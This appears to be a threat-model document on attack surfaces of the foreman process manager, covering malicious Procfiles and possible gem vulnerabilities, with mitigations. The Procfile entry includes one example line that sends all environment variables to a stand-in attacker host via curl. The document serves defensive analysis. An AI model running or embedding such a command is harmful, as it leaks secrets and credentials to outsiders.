# Attack Surface Analysis for ddollar/foreman

## Attack Surface: [Arbitrary Command Execution via Malicious Procfile](./attack_surfaces/arbitrary_command_execution_via_malicious_procfile.md)

*   **Description:** An attacker can execute arbitrary commands on the host system by crafting a malicious `Procfile`.
    *   **How Foreman Contributes:** Foreman directly interprets and executes the commands defined in the `Procfile`. If an attacker can modify this file, they can inject malicious commands.
    *   **Example:** A compromised developer account pushes a `Procfile` containing: `web: curl http://attacker.com/steal_secrets -d "$(env)"`. When Foreman starts the `web` process, it will execute this command, sending environment variables to the attacker.
    *   **Impact:** Full system compromise, data exfiltration, denial of service.
    *   **Risk Severity:** Critical
    *   **Mitigation Strategies:**
        *   Implement strict access control and code review processes for changes to the `Procfile`.
        *   Store the `Procfile` in a secure location with limited write access.
        *   Use infrastructure-as-code practices to manage and version control the `Procfile`.
        *   Consider using environment variables or configuration files for sensitive settings instead of embedding them directly in commands.

## Attack Surface: [Vulnerabilities in the Foreman Gem Itself](./attack_surfaces/vulnerabilities_in_the_foreman_gem_itself.md)

*   **Description:** Security vulnerabilities might exist within the `foreman` gem codebase itself.
    *   **How Foreman Contributes:** Any inherent vulnerabilities in Foreman's code could be directly exploited if an attacker finds a way to interact with Foreman's functionalities in an unintended way.
    *   **Example:** A hypothetical vulnerability in Foreman's process management logic could allow an attacker to manipulate process signals or arguments, leading to unintended behavior or even code execution.
    *   **Impact:** Depends on the nature of the vulnerability, potentially leading to arbitrary command execution or denial of service.
    *   **Risk Severity:** High (can be Critical depending on the specific vulnerability)
    *   **Mitigation Strategies:**
        *   Keep Foreman updated to the latest stable version to benefit from security patches.
        *   Monitor security advisories and release notes for the `foreman` gem.
        *   Report any suspected vulnerabilities in Foreman to the maintainers.
